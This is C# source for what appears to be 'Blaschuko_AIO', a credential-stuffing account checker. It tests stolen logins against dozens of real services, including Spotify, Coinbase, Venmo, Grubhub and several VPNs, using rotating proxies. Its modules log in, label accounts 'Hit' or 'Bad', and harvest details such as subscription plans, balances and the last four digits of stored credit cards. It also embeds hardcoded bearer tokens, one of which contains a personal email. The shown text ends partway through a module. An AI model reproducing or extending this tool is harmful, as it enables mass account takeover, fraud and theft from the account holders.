using Discord.WebSocket;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.UI.WebControls.WebParts;
using System.Security.Cryptography;
using System.Drawing;
using System.Windows;
using System.Management;
using System.Diagnostics.Eventing.Reader;
using System.Net;
using HttpStatusCode = Leaf.xNet.HttpStatusCode;
using System.Collections;
using System.Threading;

namespace Blaschuko_AIO
{
    class Modules
    {
        public static Dictionary<string, Func<string, string, string>> functions = new Dictionary<string, Func<string, string, string>>();
        public static List<string> moduleList = new List<string>();
        public static void LoadModules()
        {
            functions["Origin"] = origin;
            functions["Uplay"] = Uplay;
            functions["Minecraft"] = minecraft;
            functions["Valorant"] = ValorantCheck;
            functions["LoL EUW"] = LoLEUW;
            functions["LoL NA"] = LoLNA;
            functions["Steam"] = SteamCheck;
            functions["CallOfDuty"] = CallOfDutyCheck;
            functions["Hulu"] = Hulu;
            functions["Disney+"] = Disnet; // 10
            functions["Funimation"] = Funimation;
            functions["PornHub"] = PornHub;
            functions["Napster"] = Napster;
            functions["WWE"] = WWE;
            functions["EpixNow"] = EpixNow;
            functions["DC Universe"] = DCUniverse;
            functions["Plex"] = Plex;
            functions["Pandora"] = PandoraCheck;
            functions["CrunchyRoll"] = CrunchyRollCheck;
            functions["Spotify"] = Spotify; // 20
            functions["MyCanal"] = MyCanal;
            functions["Twitch"] = Twitch;
            functions["Fubo TV"] = Fubo;
            functions["Domino's"] = Domino;
            functions["BWW"] = BWW;
            functions["DoorDash"] = Doordash;
            functions["KFC"] = KFC;
            functions["ShakeShack"] = ShakeShack;
            functions["Wendy"] = Wendy;
            functions["SliceLife"] = SliceLifeCheck;
            functions["Glovo"] = Glovo;
            functions["Cold Stone Creamery"] = ColdStone; // 30
            functions["Grubhub"] = Grubhub;
            functions["NordVPN"] = NordVPN;
            functions["HMA"] = HMA;
            functions["TunnelBear"] = TunnelBear;
            functions["IPvanish"] = IPvanish;
            functions["VyprVPN"] = VyprVPN;
            functions["TigerVPN"] = TigerVPN;
            functions["SurfShark"] = SurfShark;
            functions["Chegg"] = Chegg;
            functions["Forever21"] = Forever21;
            functions["Gucci"] = WishCheck;
            functions["GoDaddy"] = GoDaddy;
            functions["Walmart"] = Walmart;
            functions["Fuel Rewards"] = FuelRewards;
            functions["FWRD"] = FWRDCheck;
            functions["Goat"] = GoatCheck;
            functions["Patreon"] = Patreon;
            functions["Namecheap"] = Namecheap;
            functions["Venmo"] = Venmo;
            functions["Coinbase"] = Coinbase;
            functions["Gamefly"] = Gamefly;
            functions["Restocks.net"] = Restocks;
            functions["Gfuel"] = Gfuel;
            functions["Avira"] = Avaria;
            functions["Bitdefender"] = Bitdefender;
            functions["Kaspersky"] = Kaspersky;
            functions["Mail Access"] = Maill_Access;
            functions["Reddit"] = RedditCheck;
            functions["Yahoo"] = Yahoo;
            functions["Acorns"] = Acorns;
            functions["Honeygain"] = Honeygain;
            functions["Fluent"] = Fluent;

            moduleList = new List<string>(functions.Keys);
        }

        static void SetBasicRequestSettingsAndProxies(HttpRequest req)
        {
            req.IgnoreProtocolErrors = true;
            req.ConnectTimeout = 8000;
            req.KeepAliveTimeout = 10000;
            req.ReadWriteTimeout = 10000;
            req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
            if (Config.useProxies)
            {
                string[] proxy = Check.getProxy().Split(':');
                ProxyClient proxyClient = Config.proxyType == "SOCKS5" ? new Socks5ProxyClient(proxy[0], int.Parse(proxy[1])) : Config.proxyType == "SOCKS4" ? new Socks4ProxyClient(proxy[0], int.Parse(proxy[1])) : (ProxyClient)new HttpProxyClient(proxy[0], int.Parse(proxy[1]));
                if (proxy.Length == 4)
                {
                    proxyClient.Username = proxy[2];
                    proxyClient.Password = proxy[3];
                }
                req.Proxy = proxyClient;
            }
        }




        #region SurfShark
        static string SurfShark(string login, string password)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("Content-Type", "application/json;charset=utf-8");

                        req.UserAgent = "Surfshark/2.11.0 (com.surfshark.vpnclient.ios; build:7; iOS 14.0.0) Alamofire/5.0.0";

                        HttpResponse res = req.Post(new Uri("https://api.surfshark.com/v1/auth/login"), new BytesContent(Encoding.Default.GetBytes("{\"username\":\"" + login + "\",\"password\":\"" + password + "\"}")));
                        string strResponse = res.ToString();

                        if (strResponse.Contains("\"token\":\""))
                        {
                            string token = Regex.Match(strResponse, "\"token\":\"(.*?)\"").Groups[1].Value;

                            string captures = SurfSharkGetCaptures(token);

                            if (captures == "")
                                return "Hit";

                            return captures;
                        }
                        else if (res.StatusCode == HttpStatusCode.Unauthorized)
                        {
                            return "Bad";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
        }
        static string SurfSharkGetCaptures(string token)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.Authorization = "Bearer " + token;

                        req.UserAgent = "Surfshark/2.11.0 (com.surfshark.vpnclient.ios; build:7; iOS 14.0.0) Alamofire/5.0.0";

                        string strResponse = req.Get(new Uri("https://api.surfshark.com/v1/payment/subscriptions/current")).ToString();

                        if (strResponse.Contains("{"))
                        {
                            string planType = Regex.Match(strResponse, "name\":\"(.*?)\"").Groups[1].Value;
                            string renewable = Regex.Match(strResponse, "renewable\":(.*?),").Groups[1].Value;

                            return $"Plan: {planType} - Renewable: {renewable}";
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
        }
        #endregion




        #region Valorant
        static string ValorantCheck(string login, string password)
        {

            while (true)
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        CookieStorage cookies = new CookieStorage();
                        string csrf = ValorantGetToken(ref cookies, req.Proxy);

                        if (csrf == "")
                            continue;

                        req.AddHeader("Content-Type", "application/json");
                        req.Referer = "https://auth.riotgames.com/login";
                        req.Cookies = cookies;
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0";


                        string strResponse = req.Put(new Uri("https://auth.riotgames.com/api/v1/authorization"), new BytesContent(Encoding.Default.GetBytes("{\"type\":\"auth\",\"username\":\"" + login + "\",\"password\":\"" + password + "\",\"remember\":false,\"language\":\"en_US\"}"))).ToString();

                        if (strResponse.Contains("\"error\":\"auth_failure\""))
                        {
                            return "Bad";
                        }
                        else if (strResponse.Contains("\"uri\":\""))
                        {
                            string url = Regex.Match(strResponse, "uri\":\"(.*?)\"").Groups[1].Value;
                            string token = Regex.Match(url, "https://playvalorant\\.com/opt_in#access_token=(.*?)&").Groups[1].Value;

                            string capture = "";

                            for (int i2 = 0; i2 < Config.retries + 1; i2++)
                            {
                                capture = ValorantGetCaptures(token, cookies);
                                if (capture != "") break;
                            }

                            if (capture == "")
                                return $"Hit";

                            return capture;
                        }
                        Check.errors++;
                        continue;
                    }
                }
                catch
                {
                    Check.errors++;
                }
            }
        }
        static string ValorantGetToken(ref CookieStorage cookies, ProxyClient proxy)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    SetBasicRequestSettingsAndProxies(req);
                    req.Proxy = proxy;
                    cookies = new CookieStorage();
                    req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
                    req.Cookies = cookies;

                    string strResponse = req.Get(new Uri("https://auth.riotgames.com/authorize?state=bG9naW4=&nonce=MjYsMjA2LDcyLDY3&prompt=login&ui_locales=en&client_id=play-valorant-web-prod&response_type=token id_token&scope=account openid&redirect_uri=https://playvalorant.com/opt_in")).ToString();

                    return "-";
                }
            }
            catch
            {
                Check.errors++;
            }
            return "";
        }
        static string ValorantGetCaptures(string token, CookieStorage cookies)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.Authorization = $"Bearer {token}";
                        req.Referer = "https://playvalorant.com/en-us/download/";
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0";
                        req.Cookies = cookies;

                        string strResponse = req.Post(new Uri($"https://auth.riotgames.com/userinfo")).ToString();

                        string mail_verified = Regex.Match(strResponse, "\"email_verified\":(.*?),").Groups[1].Value;
                        string region = Regex.Match(strResponse, "\"tag_line\":\"(.*?)\"").Groups[1].Value;

                        return $"Email Verified {mail_verified} - Region: {region}";
                    }
                }
                catch
                {
                    Check.errors++;
                }
        }
        #endregion





        #region FuboTV
        static string Fubo(string login, string password)
        {
            while (true)
                try
                {
                    string guid = Guid.NewGuid().ToString().ToUpper();

                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("X-Device-Name", "Bob");
                        req.AddHeader("X-Device-Model", "iPhone 7 Plus");
                        req.AddHeader("X-Device-Type", "phone");
                        req.AddHeader("X-Device-Group", "mobile");
                        req.AddHeader("X-Client-Country", "US");
                        req.AddHeader("X-Client-Version", "5.5.3");
                        req.AddHeader("X-Preferred-Language", "en-US");
                        req.AddHeader("X-Device-Platform", "iphone");
                        req.AddHeader("X-Player-Version", "24.3.8");
                        req.AddHeader("X-Sender", "FuboTV 5.5.3");
                        req.AddHeader("X-Device-App", "ios");
                        req.AddHeader("X-Client-Postal", "89052");
                        req.AddHeader("X-Device-Id", guid);

                        req.UserAgent = "FuboTV/5.5.3  (tv.fubo.mobile; build:12399; iOS 13.2.0) Networking/30.1.4";

                        HttpResponse res = req.Put(new Uri("https://api.fubo.tv/signin"), new BytesContent(Encoding.Default.GetBytes("{\"username\":\"" + login + "\",\"password\":\"" + password + "\"}")));
                        string strResponse = res.ToString();

                        if (strResponse.Contains("\"access_token\":\""))
                        {
                            string token = Regex.Match(strResponse, "\"access_token\":\"(.*?)\"").Groups[1].Value;

                            string captures = FuboTVGetCaptures(token);

                            if (captures == "")
                                return "Hit";

                            return captures;
                        }
                        else if (strResponse.Contains("{\"code\":\"INVALID_USERNAME_PASSWORD\"") || strResponse.Contains("\"message\":\"The username and/or password used for authentication are invalid\"}}"))
                        {
                            return "Bad";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
        }
        static string FuboTVGetCaptures(string token)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.Authorization = "Bearer " + token;

                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";

                        string strResponse = req.Get(new Uri("https://api.fubo.tv/subscription")).ToString();

                        if (strResponse.Contains("\"state\":\"active\""))
                        {
                            string billingdate = Regex.Match(strResponse, "\"current_period_ends_at\":\"(.*?)\"").Groups[1].Value;
                            string subscription = Regex.Match(strResponse, "\"name\":\"(.*?)\"").Groups[1].Value;

                            return $"Subscription: {subscription} - Billing Date: {billingdate} ";
                        }
                        else if (strResponse.Contains("{\"code\":\"SUBSCRIPTION_NOT_FOUND\"") && strResponse.Contains("\"state\":\"expired\""))
                        {
                            return "Free";
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
        }
        #endregion




        #region GFuel
        static string Gfuel(string login, string password)
        {

            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("Content-Type", "application/graphql; charset=utf-8");
                        req.AddHeader("Accept", "application/json");
                        req.AddHeader("X-Shopify-Storefront-Access-Token", "21765aa7568fd627c44d68bde191f6c0");
                        HttpResponse res = req.Post(new Uri("https://gfuel.com/api/2020-01/graphql"), new BytesContent(Encoding.Default.GetBytes("mutation{customerAccessTokenCreate(input:{email:\"" + login + "\",password:\"" + password + "\"}){customerAccessToken{accessToken,expiresAt},userErrors{field,message}}}")));
                        string strResponse = res.ToString();

                        if (strResponse.Contains("\"accessToken\""))
                        {
                            string accessToken = Regex.Match(strResponse, "\"accessToken\":\"(.*?)\"").Groups[1].Value;
                            string capture = "";

                            for (int i2 = 0; i2 < 2 + 1; i2++)
                            {
                                capture = GFuelGetCaptures(accessToken, login);
                                if (capture != "") break;
                            }

                            if (capture == "")
                                return $"Hit";

                            return capture;
                        }
                        return "Bad";
                    }
                }
                catch
                {
                    Check.errors++;
                }
        }
        static string GFuelGetCaptures(string token, string email)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("Content-Type", "application/graphql; charset=utf-8");
                        req.AddHeader("Accept", "application/json");
                        req.AddHeader("X-Shopify-Storefront-Access-Token", "21765aa7568fd627c44d68bde191f6c0");
                        string strResponse = req.Post(new Uri($"https://gfuel.com/api/2020-01/graphql"), new BytesContent(Encoding.Default.GetBytes("{customer(customerAccessToken:\"" + token + "\"){createdAt,displayName,email,id,firstName,lastName,phone}}"))).ToString();

                        if (strResponse.Contains("\"id\":\""))
                        {
                            string creation_date = Regex.Match(strResponse, "createdAt\":\"(.*?)\"").Groups[1].Value.Split('T')[0];
                            string userId = Regex.Match(strResponse, "\"id\":\"(.*?)\"").Groups[1].Value.Split('T')[0];
                            string decodedId = Utils.Base64Decode(userId).Replace("gid://shopify/Customer/", "");

                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            req.AddHeader("Accept", "*/*");
                            string strResponse2 = req.Get($"https://loyalty.yotpo.com/api/v1/customer_details?customer_email={email}&customer_external_id={decodedId}&customer_token={token}&merchant_id=33869").ToString();

                            if (strResponse2.Contains("\"created_at\""))
                            {
                                string pointsBalance = Regex.Match(strResponse2, "\"points_balance\":(.*?),").Groups[1].Value;
                                string vipStatus = Regex.Match(strResponse2, ",\"campaign\":{\"title\":\"Earned Tier (.*?)\"").Groups[1].Value;
                                string purchases = Regex.Match(strResponse2, "\"purchases_made\":(.*?),").Groups[1].Value;

                                if (pointsBalance == "" || pointsBalance == "0")
                                    return "Free";

                                return $"Points Balance: {pointsBalance} - Vip Status: {vipStatus} - Purchases: {purchases}";
                            }
                            else if (strResponse2.Contains("\"message\":\"Unidentified customer\"}"))
                                return "";
                        }
                        else
                        {
                            return "";
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
        }
        #endregion




        static string Fluent(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {

                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("Auth0-Client", "eyJuYW1lIjoibG9jay5qcyIsInZlcnNpb24iOiIxMS4yNS4xIiwiZW52Ijp7ImF1dGgwLmpzIjoiOS4xMy40In19");
                        req.AddHeader("Host", "accounts.fluent-forever.app");
                        req.AddHeader("Origin", "https://fluent-forever.app");
                        req.AddHeader("Referer", "https://fluent-forever.app/");

                        string data = "{\"client_id\":\"GgslJxKgxf1xbZAwszpD5dZU027umnL7\",\"username\":\"" + email + "\",\"password\":\"" + password + "\",\"realm\":\"Username-Password-Authentication\",\"credential_type\":\"http://auth0.com/oauth/grant-type/password-realm\"}";
                        HttpResponse res = req.Post(new Uri("https://accounts.fluent-forever.app/co/authenticate"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res.ToString();
                        if (login.Contains("login_ticket"))
                        {
                            return "Hit";
                        }
                        else if (login.Contains("Wrong email or password."))
                        {
                            return "Bad";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }







        static string Honeygain(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {

                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        req.AddHeader("Host", "dashboard.honeygain.com");
                        req.AddHeader("Origin", "https://dashboard.honeygain.com");
                        req.AddHeader("Referer", "https://dashboard.honeygain.com/login");

                        string data = "{\"email\":\"" + email + "\",\"password\":\"" + password + "\"}";
                        HttpResponse res = req.Post(new Uri("https://dashboard.honeygain.com/api/v1/users/tokens"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res.ToString();
                        if (login.Contains("{\"type\":401,\"title\":\"not_valid_login_credentials\",\"details\":\"Bad credentials.\"}")) return "Bad";
                        else if (login.Contains("access_token"))
                        {
                            req.ClearAllHeaders();

                            req.AddHeader("authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2MDIxNzIwMTMsImV4cCI6MTYzMzcwODAxMywicm9sZXMiOlsiUk9MRV9VU0VSIiwiUk9MRV9UT1NfQUNDRVBURUQiLCJST0xFX0NPTkZJUk1FRF9FTUFJTCJdLCJlbWFpbCI6Imhha2ltMTA0QGdtYWlsLmNvbSJ9.kt3cG2onrpVbZWeZIUZfuuIJckueU1ymbsOvnjbVNBDY5L0KQ6438Bv92fj0m0IXqVy20JU2q0fjO3aJFHJm4iIClEATKSFDqhNI6EDwfTN37BEOU2VheUBqWJVqtSN_yFC4aQJWtHqOpF9_0zXzKHUAiKZ6ALFNY4NzF-IMCMP4yK6cfhAE_ChWPVyxDWpHpw0lWUAFf_hUXoYvvNSqbSeBSJ7MPCGzho24Ai8B2ZM_SqHwvqF8Fe0MTBCO1go3dJJiBOH4b3qvvslBD6Y1m5bVjJ-R6G83XFIFNhr0Vg89YiRHjXlyUiEOf5RRvfXEEfVIS7FCE5yryA6vsLEQvKk0PQvfYi-ENxNLOu_Oku8OMaQzE4tR4e0ApFcYF35s3C48enifMrxfkf5797eABeGCMhI1TWt9jhLwsVTiiD5sTFTJmYq1ADjWzNqTt5e8rs3ecmNfo1Pa2oiqhvwlXI9oRKhMUexvYE4IwFTSWEnfadEpMqBHuWWgHXR4zJPHkm29TujeRAMQ-iCf6wGzwKVv8cp4jMiMjv4RIwjmdHQEZgBrGCouC4MhbtIzDydTeCOYaDDp2u23JCOdnu0P_8n8YtyhU2Rpv6wL9FLyXOWaccxGFFnhXbBQkp0H0knUcPk9YQ7MGlImxJGjSHOSFEyCDIQgtfS0nv15XvNqztY");
                            req.AddHeader("referer", "https://dashboard.honeygain.com/");
                            req.AddHeader("sec-fetch-dest", "empty");
                            req.AddHeader("sec-fetch-mode", "cors");
                            req.AddHeader("sec-fetch-site", "same-origin");
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");

                            HttpResponse res2 = req.Get(new Uri("https://dashboard.honeygain.com/api/v1/users/balances"));
                            string cap = res2.ToString();
                            string balance = Parse(cap, "credits\":", ",");
                            return "Credits: " + balance;
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }




        static string Grubhub(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        req.AddHeader("authority", "www.grubhub.com");
                        req.AddHeader("accept", "*/*");
                        req.AddHeader("pragma", "no-cache");
                        req.AddHeader("referer", "https://www.grubhub.com/service-worker.js");
                        req.AddHeader("service-worker", "script");
                        req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36");

                        HttpResponse res = req.Get(new Uri("https://www.grubhub.com/service-worker.js"));


                        string clientid = "beta_" + Parse(res.ToString(), "\"},clientId:\"beta_", "\",hostName:\"https");

                        req.ClearAllHeaders();

                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        req.AddHeader("Authorization", "Bearer f7c59f41-69d0-45e1-8298-7184d3d2ad3a");
                        req.AddHeader("Content-type", "application/json;charset=UTF-8");
                        req.AddHeader("Origin", "https://www.grubhub.com");
                        req.AddHeader("Referer", "https://www.grubhub.com/login");

                        string data = "{\"brand\":\"GRUBHUB\",\"client_id\":\"" + clientid + "\",\"device_id\":1032112575,\"email\":\"" + email + "\",\"password\":\"" + password + "\"}";
                        HttpResponse res2 = req.Post(new Uri("https://api-gtm.grubhub.com/auth"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res2.ToString();

                        Int32 responsecode = Convert.ToInt32(res2.StatusCode);

                        if (responsecode == 401) return "Bad";
                        else if (responsecode == 200)
                        {
                            string uuid = Parse(login, "ud_id\":\"", "\",\"");
                            string access_code = Parse(login, "\":{\"access_token\":\"", "\",\"");
                            req.ClearAllHeaders();
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36");
                            req.AddHeader("Pragma", "no-cache");
                            req.AddHeader("Accept", "application/json");
                            req.AddHeader("Authorization", "Bearer " + access_code);
                            req.AddHeader("Cache-Control", "no-cache");
                            req.AddHeader("If-Modified-Since", "0");
                            req.AddHeader("Origin", "https://www.grubhub.com");
                            req.AddHeader("Referer", "https://www.grubhub.com/account/payment");

                            HttpResponse res3 = req.Get(new Uri("https://api-gtm.grubhub.com/payments/" + uuid + "/credit_card"));
                            string cccap = res3.ToString();
                            string cc_type = Parse(cccap, "credit_card_type\":\"", "\",");
                            string lastfournumbers = Parse(cccap, "credit_card_last4\":\"", "\",");
                            string expired = Parse(cccap, "expired\":", ",\"");

                            req.ClearAllHeaders();

                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                            req.AddHeader("Pragma", "no-cache");
                            req.AddHeader("Accept", "application/json");
                            req.AddHeader("Authorization", "Bearer " + access_code);

                            HttpResponse res4 = req.Get(new Uri("https://api-gtm.grubhub.com/codes/vault/" + uuid + "/giftcards"));
                            string balancecap = res4.ToString();

                            string balance = Parse(balancecap, "amount_remaining\":", "}");

                            return $"CC Type: {cc_type} | Last 4 CC Digits: {lastfournumbers} | Expired: {expired} | Balance: {balance}";
                        }
                        else { Check.errors++; continue; }

                    }
                }
                catch
                {

                    Check.errors++;
                    continue;
                }
            }
        }







        static string Acorns(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("accept", "*/*");
                        req.AddHeader("accept-encoding", "gzip, deflate, br");
                        req.AddHeader("accept-language", "en-US,en;q=0.9");
                        req.AddHeader("origin", "https://signin.acorns.com");
                        req.AddHeader("sec-fetch-dest", "empty");
                        req.AddHeader("sec-fetch-mode", "cors");
                        req.AddHeader("sec-fetch-site", "same-site");
                        req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.228");
                        req.AddHeader("x-client-app", "web-app");
                        req.AddHeader("x-client-browser", "Opera");
                        req.AddHeader("x-client-browser-version", "71.0.3770.228");
                        req.AddHeader("x-client-build", "undefined");
                        req.AddHeader("x-client-hardware", "undefined");
                        req.AddHeader("x-client-os", "Windows");
                        req.AddHeader("x-client-platform", "web");

                        string data = "[{\"operationName\":\"Authenticate\",\"variables\":{\"input\":{\"email\":\"" + email + "\",\"password\":\"" + password + "\",\"udid\":\"udid\"}},\"query\":\"mutation Authenticate($input: AuthenticateInput!) {  authenticate(input: $input) {    __typename    ... on AuthSession {      id      token      identityId      __typename    }    ... on SMSAuthChallenge {      id      maskedPhoneNumber      __typename    }    ... on InvalidCredentialsException {      message      __typename    }    ... on UserSuspendedException {      message      __typename    }    ... on DeviceBlockedException {      message      __typename    }    ... on UserLockedException {      message      __typename    }  }}\"}]";
                        HttpResponse res = req.Post(new Uri("https://graphql.acorns.com/graphql"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res.ToString();

                        if (login.Contains("provided credentials were incorrect")) return "Bad";
                        else if (login.Contains("AuthSession"))
                        {
                            req.ClearAllHeaders();
                            req.AddHeader("Content-Type", "application/json");
                            req.AddHeader("origin", "https://app.acorns.com");
                            req.AddHeader("referer", "https://app.acorns.com/");
                            req.AddHeader("sec-fetch-dest", "empty");
                            req.AddHeader("sec-fetch-mode", "cors");
                            req.AddHeader("sec-fetch-site", "same-site");
                            req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36");
                            req.AddHeader("x-client-app", "web-app");
                            req.AddHeader("x-client-browser", "Chrome");
                            req.AddHeader("x-client-browser-version", "85.0.4183.121");
                            req.AddHeader("x-client-build", "3.59.0");
                            req.AddHeader("x-client-hardware", "undefined");
                            req.AddHeader("x-client-os", "Windows");
                            req.AddHeader("x-client-platform", "web");
                            string data2 = "[{\"operationName\":\"CoreDetailsQuery\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"44ea97985b87b5e5e185e4032ff7cc26b8ea6c443669d079bc1b183bd22f470d\"}}},{\"operationName\":\"ActionFeed\",\"variables\":{\"feedContext\":\"a4Invest\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ef80b38156bb535cd79a17c0da95b8e3c31e1148839380154df8dbc1cc1b2f97\"}}},{\"operationName\":\"OnboardingTips\",\"variables\":{\"feedContext\":\"a4_home\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"9082944d6988bf0e6520f292035d019e6ed78bcccf5e81beefcc8b53ba6dea68\"}}}]";
                            HttpResponse res2 = req.Post(new Uri("https://graphql.acorns.com/graphql"), new BytesContent(Encoding.Default.GetBytes(data2)));
                            string balance = Parse(res2.ToString(), "currentBalance\":{\"value\":", ",");
                            int balance_int;
                            try
                            {
                                balance_int = Convert.ToInt32(balance);
                            }
                            catch
                            {
                                return "Error in capture";
                            }

                            if (balance_int < 1) return "Free";
                            else return "Balance: $" + balance;
                        }
                        if (login.Contains("UserLockedException") | login.Contains("access locked"))
                        {
                            return "2FA";
                        }
                        else if (login.Contains("DeviceBlockedException"))
                        {
                            return "2FA";
                        }
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {

                    Check.errors++;
                    continue;
                }
            }
        }





        static string Restocks(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("referer", "https://restocks.net/login");
                        req.AddHeader("upgrade-insecure-requests", "1");
                        req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Edg/86.0.622.38");
                        req.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                        req.AddHeader("accept-encoding", "gzip, deflate, br");
                        req.AddHeader("accept-language", "en-US,en;q=0.9");
                        req.AddHeader("cache-control", "max-age=0");

                        string get = req.Get(new Uri("https://restocks.net/login")).ToString();
                        string csrf = Parse(get, "<meta name=\"csrf-token\" content=\"", "\"");

                        req.ClearAllHeaders();

                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        req.AddHeader("ccept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                        req.AddHeader("accept-encoding", "gzip, deflate, br");
                        req.AddHeader("accept-language", "en-US,en;q=0.9");
                        req.AddHeader("cache-control", "max-age=0");
                        req.AddHeader("content-type", "application/x-www-form-urlencoded");
                        req.AddHeader("origin", "https://restocks.net");
                        req.AddHeader("referer", "https://restocks.net/login");
                        req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Edg/86.0.622.38");
                        string data = $"_token={csrf}&email={email}&password={password}";
                        HttpResponse res = req.Post(new Uri("https://restocks.net/login"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res.ToString();

                        if (login.Contains("auth.failed")) return "Bad";
                        else if (login.Contains("Welcome back!") || login.Contains("Most Popular"))
                        {
